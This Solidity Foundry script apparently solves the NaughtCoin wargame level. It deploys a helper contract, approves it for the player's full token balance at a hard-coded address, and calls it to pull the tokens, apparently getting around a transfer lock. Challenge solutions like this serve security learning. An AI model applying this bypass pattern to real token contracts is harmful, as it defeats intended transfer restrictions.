// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

import {NaughtCoinSolution} from "../NaughtCoinSolution.sol";

contract NaughtCoinScript is Script {
  address private user = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;
  address private naughtCoinContract = 0x6C74C66ECC7d5E503585D49885FBE90085E0815D;

  NaughtCoinSolution private naughtCoinSolution;

  function run() external {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(deployerPrivateKey);

    naughtCoinSolution = new NaughtCoinSolution();

    (bool successBalance, bytes memory dataBalance) = naughtCoinContract.call(abi.encodeWithSignature("balanceOf(address)", user));

    require(successBalance);

    uint256 _balance = uint256(bytes32(dataBalance));

    (bool successApprove, bytes memory dataApprove) = naughtCoinContract.call(
      abi.encodeWithSignature("approve(address,uint256)", naughtCoinSolution, _balance)
    );

    require(successApprove);

    naughtCoinSolution.getAllBalance(_balance);

    vm.stopBroadcast();
  }
}
